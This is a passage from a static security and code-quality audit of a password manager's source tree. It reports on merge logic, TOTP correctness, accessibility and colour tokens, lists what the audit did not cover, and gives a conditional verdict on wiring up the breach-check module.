- **Tombstones cannot be resurrected.** All four branches of `mergeTrash`
  (`merge-record.ts:503-564`) walked. A live record never beats a tombstone; the only path returning
  `trashedAt: null` requires an ancestor that was _already trashed_ with a tombstone the trashing side
  left byte-identical — the genuine "the other side restored it" case. Two tombstones take `Math.max`,
  which is commutative and lengthens rather than shortens the restore window. Tombstone timestamps
  _are_ trusted from the file, but the worst an attacker-supplied value achieves is a record sitting
  in Trash longer than intended. The 3×3×3 matrix at `properties.test.ts:264-323` covers this in both
  argument orders.
- **`assertValidHistory` cannot be made to fail by a merge.** Ascending is preserved on both paths —
  the renumber path assigns `index + 1`, the untouched path returns a side's own array — and
  `appendVersion` reads `last.versionNumber + 1` from the _already-merged_ array. The retention cap is
  applied after combining and again after the append. Snapshots are never rewritten, so one cannot
  acquire a key, and the merge's own version takes its snapshot from `snapshotOf(ours, changed)` where
  `changed` is exactly the diff. Note that `assertValidHistory` requires _strictly ascending_, not
  contiguous, which is what makes the pruning-gap preservation at `merge-history.ts:145` legal.
- **The pre-merge backup is correctly not this engine's job.** `src/main/sync/index.ts:14-15` states
  the obligation and assigns it to the caller. `mergeDocuments` has **zero callers anywhere in
  `src/`**, so hard rule 6's backup requirement is currently satisfied by nothing at all, simply
  because no code path reaches a merge. Flagged so it is not assumed done when the caller is written.

### `organisation/` and `totp/` correctness

- **Cycles cannot hang anything.** `walkAncestors` (`folder-tree.ts:82-96`) carries a `seen` set;
  `subtreeHeight` (`:134-149`) is an iterative BFS with a `seen` set; `collectDescendantFolderIds`
  (`src/shared/search/filter.ts:218-229`) is an iterative DFS with a `seen` set. A 200-folder full
  cycle is tested at `integrity.test.ts:99-107` and a 2-cycle at `folder-ops.test.ts:399-407`.
  Self-parent, orphan and depth-bomb are all covered. (N19 is about _size_, not cycles.)
- The depth cap is `MAX_FOLDER_DEPTH = 16`, enforced on create (`:211`), on move (`:277`) and on path
  creation (`:373`), and `moveFolder` correctly measures the **subtree being carried**
  (`subtreeHeight`) rather than just the dragged folder — the case a naive check waves through, tested
  at `folder-ops.test.ts:269-289`.
- Neither `deleteFolder` policy destroys a record (`folder-ops.test.ts:346-351`). Folders and tags
  carry no tombstone **by design and correctly**: they hold no content, and undo is "the previous
  document" (`folder-ops.ts:26-29`, `tag-ops.ts:329-336`). The tombstone rule applies to credentials,
  which leave only via the trash.
- `renameTag` rewrites every record **including trashed ones** — the classic bug this module exists
  not to have — refuses a collision rather than silently merging, and preserves id and colour.
- **`organisation/tag-colours.ts` emits no colour at all.** It is a 17-line re-export of
  `TAG_COLOUR_TOKENS` from `@shared/model/organisation.ts:55`, a `satisfies readonly ColourToken[]`
  list of five **token names**. `assertValidTagColour` (`tag-ops.ts:93`) rejects raw values, and
  `tag-colours.test.ts` verifies the tokens resolve in every theme, borrow no status token, and that
  `isTagColour` rejects `'#ff0000'`, `'red'` and `'rgb(1,2,3)'`. The renderer's own
  `organisation/tag-colours.ts` likewise emits only `var(--kh-color-*)` references and coerces any
  unrecognised string — including a raw hex arriving from a merge — to `DEFAULT_TAG_COLOUR`. Hard rule
  4 is fully satisfied here.
- **`totp/`'s cryptography is textbook and verified against the RFCs.** HMAC is Node's `createHmac`.
  Counter derivation (`totp.ts:107-119`) is correct big-endian eight bytes; dynamic truncation
  (`:89-96`) is RFC 4226 §5.3 exactly, including the `& 0x7f` mask; the tests reproduce the RFC 4226
  Appendix D vectors and all three algorithms across the six times of the RFC 6238 Appendix B table.
  Verification is `timingSafeEqual` (`:253`) and **every step in the skew window is compared even
  after a match** — `matched === null` is the _last_ conjunct, so the comparison is never
  short-circuited. Parameters are validated against a fixed allow-list at the point of use, not only
  at parse (`parameters.ts:107`), explicitly because they also arrive from the vault file, IPC and
  merges; `skew` is capped at 10 (`totp.ts:230`), which stops a hostile `skewSteps: 5000` looping.
  `parameters.ts:80-85` refuses `Number.parseInt`'s sloppiness (`8abc`, `8.5`). `uri.ts:138-140`
  decodes the seed **last**, so a URI rejected for a bad parameter never materialises key material.
- **base32 decoding is strict in the right places:** it rejects `0`/`1`/`8`/`9` rather than
  "repairing" them to `O`/`L` — with a test at `base32.test.ts:138-149` proving the repair would have
  been silent and wrong — rejects non-canonical trailing bits, impossible lengths and interior `=`,
  and round-trips at every length 1–64.
- **Neither a TOTP seed nor a generated code reaches the renderer today**, because no IPC channel
  exists: a grep of `src/main/ipc/` and `src/preload/` for `totp`, `otpauth` and `otp-secret` returns
  zero hits. The projection type is already correct for when it is wired — `otp-secret` is in
  `SECRET_CUSTOM_FIELD_TYPES`, so `isCustomFieldValueSecret` returns true and
  `CustomFieldProjection.value` is omitted.

### Renderer cleanup, keyboard access and colour

- **Cleanup is complete except for N11 and N32(a).** Every timer is cleared
  (`use-export-dialog.ts:170-173`, `MasterPasswordStep.tsx:94-96`, `ImportWizard.tsx:193-195`); every
  subscription returns its unsubscribe (`ImportWizard.tsx:135-141`, `recent-commands.ts:82` →
  `CommandsProvider.tsx:89`, `theme-file-bridge.ts:132,136`); every fetch effect has a cancellation
  flag (`use-export-dialog.ts:104/113,122-149`; `ImportWizard.tsx:113-131`; the `previewSequence` ref
  at `:101/160/175`), and `use-settings.ts` carries both an `alive` ref and an `AbortController` flag.
  `use-shortcuts.ts:131`'s global `keydown` is removed in cleanup, registered **once** (`[enabled]`
  dep only, environment in a ref) so a re-render cannot double-register, and on the bubble phase
  deliberately so `Modal` can claim Escape first — `use-shortcuts.test.tsx:121,134` proves the removal
  by mounting and unmounting three times and asserting the handler fires exactly once afterwards.
  **Zero `setInterval`, `MutationObserver`, `ResizeObserver` or `matchMedia`** in the seven audited
  renderer directories.
- **Keyboard access.** Every interactive element in `export/`, `import/`, `onboarding/` and
  `settings/` is a native `<button>`, `<input>`, `<select>` or `<a>` — **no `<div onClick>`
  anywhere**. Radio groups are real `<fieldset>`/`<legend>`/`<input type="radio">`, so arrow keys, a
  roving tab stop and "n of m" come free; nothing hand-rolls `role="radio"`. Steppers are `<ol>` with
  `aria-current="step"` and visually-hidden state words. Focus moves to the step heading
  (`tabIndex={-1}`) on every transition in all three wizards, asserted in two tests.
  `SettingControls.tsx` structurally guarantees `<label htmlFor>` plus `aria-describedby` for help
  _and_ trade-off on every setting row; `MapColumnsStep` wires `aria-invalid` + `aria-describedby` per
  row rather than floating errors at the top.
- **The folder tree implements the APG tree pattern properly.** `role="tree"` with
  `aria-multiselectable={false}`; `role="treeitem"` with `aria-level`, `aria-posinset`, `aria-setsize`,
  `aria-selected` and `aria-expanded` **only on rows that have children** (`FolderTreeItem.tsx:154-158`)
  — the flat-DOM-with-declared-structure approach, correct for a list that will be virtualised. Roving
  tabindex is real: exactly one row at `tabIndex=0` (`:159`), with `activeId` falling back to the first
  row so the tree is always Tab-reachable. Focus is moved imperatively but **only when the tree already
  holds focus** (`:109-113`), so it cannot steal the caret. Down/Up/Right/Left/Home/End/Enter/Space/`*`
  are all in `tree-keyboard.ts` as a pure function over the flattened rows, including the correct
  Right-on-expanded → first child and Left-on-collapsed → parent behaviours and a sane recovery when
  focus sits on a deleted row; `HANDLED_TREE_KEYS` is a closed set so every other key reaches the app.
  The one APG item absent is typeahead, which APG lists as recommended rather than required.
- **Drag-and-drop has a full keyboard alternative.** `MoveToDialog.tsx` is a radio group with
  indentation, disambiguating paths, a "Current" marker and `initialFocusSelector` onto the checked
  radio; it is reachable from `FolderTree`'s toolbar (Move to…) for folders and from
  `OrganisationSidebar.tsx:174-190` (File in folder…) for records. `move-targets.ts` builds both lists
  from the same tree the sidebar renders and shares `canDropFolder` with the drag path, so the two
  cannot disagree about legality. Both dialogs are keyed on the subject id, so they remount per subject
  and the `useState` initialiser re-runs — the stale-default bug they would otherwise have does not
  exist. (The gap is tag rename, N35.)
- **The command palette is a correct `aria-activedescendant` combobox:** `role="combobox"` +
  `aria-expanded` + `aria-controls` + `aria-autocomplete="list"` on the input; `role="listbox"` with
  `role="group"` + `aria-labelledby` per section; `role="option"` + `aria-selected` per row with a
  stable `useId`-derived id. Options are non-focusable `div`s **on purpose** — a `<button>` there would
  put a tab stop inside the listbox and break typing (`CommandPalette.tsx:276-284`) — with
  `onMouseDown` + `preventDefault` so the row acts before focus leaves the input. The result count is
  in a `role="status" aria-live="polite"` region carrying **the count only**, so an arrowing
  screen-reader user does not hear the first result twice. Escape is owned by `Modal` alone.
- **No information is carried by colour alone.** Checked specifically, and every case has a second
  channel: `LOSS_KIND_SYMBOLS` are four distinct glyphs with a distinctness test
  (`export-presentation.test.ts:76-79`); `safetyBadge` says "Readable by anyone" with `⚠`; strength
  meters put the word before the bar with `role="meter"` + `aria-label`; `SettingsSection danger`
  renders the literal phrase "Danger zone —"; `TradeOffNote` prefixes "Trade-off:"/"In effect:"; import
  folder rows say "will be created"/"already exists"; `WarningList` badges carry "Lost"/"Note"; drop
  targets differ by **solid vs dashed outline** plus `cursor: not-allowed`; folder selection is a tint
  **plus** a 3px leading bar **plus** a font-weight change; broken folders get a `⚠` glyph, a `title`
  sentence and a text entry in the problem list; contrast-report rows carry a "Pass"/"Fail" word and a
  `✓`/`✕`; tag swatches are `aria-hidden` with the colour name in the `title` and selection marked by
  `aria-pressed` plus a tick; activity kinds get shape glyphs explicitly chosen to survive greyscale.
- **Destructive actions are properly gated.** Turning **on** wipe-after-failures goes through a
  `destructive` `ConfirmDialog` naming the threshold and stating "There is no recovery"
  (`SecuritySessionSection.tsx:249-289`); turning it **off** applies immediately, which is the correct
  asymmetry, and the select is controlled so cancelling snaps the value back. "Clear all history" is
  disabled at zero versions, states the exact count, and says plainly that no backup is taken. "Forget
  quick unlock" states what is deleted and that the master password still works. Plaintext export is
  gated on a typed phrase whose only construction site is `buildExportPlan`
  (`export-steps.ts:189-214`), re-verified in main on arrival, and `ExportResultStep` deliberately
  offers no "securely delete" button it could not honour.
- **`export/fake-export-gateway.ts` and `import/fake-gateway.ts` are not reachable from the production
  bundle** — excluded from their barrels by design (`export/index.ts:10-13`, `import/index.ts:16-22`),
  imported only by `*.test.ts(x)` files by path, with no runtime flag selecting them. Verified
  repo-wide. (`settings/fake-gateway.ts` and `organisation/fake-gateway.ts` are imported by nothing at
  all — N30 and N33.)
- **Zero hardcoded colours across all eleven renderer directories.** Swept every `.css`, `.tsx` and
  `.ts` for `#rgb`/`#rrggbb`/`#rrggbbaa`, `rgb(`, `rgba(`, `hsl(`, `hsla(`, `oklch(`, `color-mix(` and
  named colours in a colour position, and separately grepped every colour-bearing declaration.
  **Every one resolves to a `var(--kh-*)` token.** The literal-colour matches that exist are all
  colour-as-data or prose, and are listed here so nobody re-runs the grep and reports them:
  `theme-studio/theme-draft.test.ts` (fixtures — colour is the subject of the reducer under test),
  `theme-studio/ThemeStudio.tsx:107` (error-message prose) and `:321` (a `placeholder`),
  `theme-studio/TokenEditor.tsx:13` and `organisation/tag-colours.ts:9-10` and `commands/commands.css:8`
  (docblocks), `import.css:334,354,398,433` and `settings.css:89` (`white-space: nowrap`),
  `import.css:387` (the words "Green, amber and red" in a comment), and `border: 0` resets at
  `export.css:88,181` and `import.css:238`. Two inline-`style` clusters were judged **not** violations
  and should not be "fixed": `settings/AppearancePanel.tsx:88,90-93,118-121` and
  `theme-studio/ThemeStudio.tsx:348` paint swatches whose entire job is to _be_ a non-active theme's or
  preset's colour, which by definition cannot come from the live token set.

### Repository-wide re-checks

- **Exactly one `fetch` call site in `src/`**: `src/main/breach/https-transport.ts:123`. No
  `node:http`/`https`, no `net.request`, no `XMLHttpRequest`, no WebSocket, no `EventSource` anywhere
  else. (The absence of a _guard_ for this is N17.)
- **Three `console.*` calls across the nine main-process subsystems**, all in `shell/`
  (`shell-controller.ts:106`, `:392`, `tray.ts:65`). Two are clean; the third is N21.
- **No `dangerouslySetInnerHTML`, `innerHTML`, `insertRule`, `adoptedStyleSheets`, `eval` or
  `new Function`** anywhere in the renderer or shared tree; the only `innerHTML` hits are
  `document.body.innerHTML = ''` teardowns in tests.
- **No `Math.random()`** anywhere in any subsystem audited here.
- **SPDX headers are present** on every file read in this audit.

---

## What this audit did not cover, and why

- **The app was never run.** Everything here is static reading, plus four standalone Node snippets
  used to measure a regex, a `path.win32` behaviour, a `Response.bodyUsed` behaviour and a
  two-function string pipeline. None imported project code; none touched the network. N1's _impact_
  (an SMB connection and an NTLM handshake) is reasoned from documented Windows behaviour, not
  reproduced; what was measured is only that the path reaches `statSync` unfiltered. N5, N13 and
  N32(a) are likewise reasoned consequences of measured code shapes, not observed failures.
- **No git command was run**, by instruction.
- **`npm audit`, `npm run lint`, `npm run typecheck` and `npm test` were not run**, deliberately:
  other agents were editing the tree, so a failure could not have been attributed. Every claim above
  is from reading the source, not from a green suite. **Nothing here should be treated as verified
  by the test runner.**
- **`src/renderer/src/{health,generator,content}/` and `src/renderer/src/{vault,shell}/` were being
  written by other agents while this ran.** They were read where they bordered the scope and are not
  reported on; anything half-written in them is in-flight work, not a defect. In particular,
  `health/health-fixture.ts` and `health/health-no-secrets.test.tsx` deserve the
  fixture-plants-a-real-secret scrutiny applied elsewhere in this report and did not get it here.
  `content/` was likewise not swept.
- **`src/main/vault/`, `src/main/crypto/`, `src/main/format/`, `src/main/ipc/`, `src/shared/ipc/` and
  `src/shared/search/` were not re-audited.** Where this audit reached into them —
  `versioning.ts:430`, `credential-ops.ts`, `atomic-write.ts`, `filter.ts:452`,
  `shared/theme/keeptheme.ts`, `shared/theme/appearance.ts` — it was to follow a call from within
  scope, not to sweep them. N6, N13 and N29 all have their fix site partly outside this scope.
- **The 58 IPC handlers were not re-read.** `00-Security-Audit.md` read all 40 that existed then; the
  18 that have landed since (`kh:attachments:*`, `kh:folders:*`, `kh:tags:*`, `kh:organisation:*`,
  `kh:import:*`, `kh:settings:*`, `kh:history:*` and others) have **not** been read by either audit
  against the secret-boundary checklist. That is the largest single gap remaining and should be the
  next pass.
- **The renderer was swept for secret handling, storage, cleanup, colour and keyboard access — not
  reviewed as UI.** Visual design, copy and layout are not this audit's business.

---

## Verdict on `breach/`

**Yes, `breach/` is safe to wire up — after N10, N15 and N17, and preferably N7.**

The module is the most carefully built thing in this report and its central claim holds: the
transport's signature makes it structurally impossible to send more than twenty bits, the off state is
the absence of a capability rather than a flag, no failure path can produce `safe`, and the property
tests that assert those things plant real secrets in the positions they guard and fault-inject to
prove they bind. I looked specifically for a path to a real request without an injected transport, a
path from a malformed response to "not breached", a persisted result, a missing padding header, and a
prefix in a log or an error. **None of them exists.**

What has to happen first:

1. **N10 and N18** — the guard that proves the capability is absent can be walked past by writing an
   import in the project's own alias style, and its comment stripper fails open. Fix both, and promote
   the scan repo-wide (**N17**). A guard this feature's safety argument rests on has to be airtight
   before the feature ships, not after.
2. **N15** — decide where `clearCache()` is called and assert it from the lock path's own tests.
3. **N38** — build the kill-switch and the consent screen that hard rule 5 and the threat model both
   promise. The client's structural off-by-default is one switch; the rule asks for two.
4. **N7** — shuffle the prefix order. One import, one line, and it removes a cross-session linking
   handle the documentation currently denies exists.

N23, N24, N36 and N37 are worth fixing in the same pass but none of them blocks.

---

## Related

- [`00-Security-Audit.md`](./00-Security-Audit.md) — the first sweep, whose scope note named these nine
  subsystems as uncovered. S11 (`MAX_STRING_BYTES` counts code units) has a sibling here as N36; S14
  (duplicated caps) is referenced in N39.
- [`01-Doc-Code-Audit.md`](./01-Doc-Code-Audit.md) — the documentation half of Phase 17. Three findings
  here have a documentation face: `docs/05-Features/07-Breach-Check.md:28` repeats the ordering claim
  (N7), `report.ts:276` is a printed claim rather than a doc (N2), and `merge-collections.ts:442`
  states its own policy backwards (N9).
- [`../00-Overview/03-Threat-Model.md`](../00-Overview/03-Threat-Model.md) — §2's traffic-analysis row
  is the entry N7 asks to be made more precise.
- [`../05-Features/07-Breach-Check.md`](../05-Features/07-Breach-Check.md) — the design this audit
measured `breach/` against.
</content>
